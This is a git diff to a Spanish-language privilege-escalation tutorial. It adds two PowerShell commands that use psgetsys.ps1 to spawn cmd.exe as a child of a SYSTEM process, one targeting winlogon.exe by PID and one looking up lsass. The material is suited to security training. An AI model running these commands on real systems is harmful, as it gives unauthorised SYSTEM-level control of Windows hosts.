@@ -213,10 +213,19 @@ En este ejemplo podemos **apuntar a `winlogon.exe` con PID 612**, ya que sabemos
 
 <img width="1637" height="715" alt="image" src="https://github.com/user-attachments/assets/61dd5735-445f-4d7b-95ad-2bc7517b87e5" />
 
+Comando:
+```powershell
+ .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "C:\Windows\System32\cmd.exe", "")
+```
+
 También podríamos usar el cmdlet [Get-Process](https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.5&viewFallbackFrom=powershell-7.2) para obtener el PID de un proceso conocido que se ejecuta como SYSTEM (como LSASS) y pasar el PID directamente al script, reduciendo la cantidad de pasos necesarios:
 
 <img width="1628" height="575" alt="image" src="https://github.com/user-attachments/assets/945cd9c1-7017-46ad-bedf-35e6312f0376" />
 
+Comando:
+```powershell
+ .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id, "C:\Windows\System32\cmd.exe", "")
+```
 
 ---
 
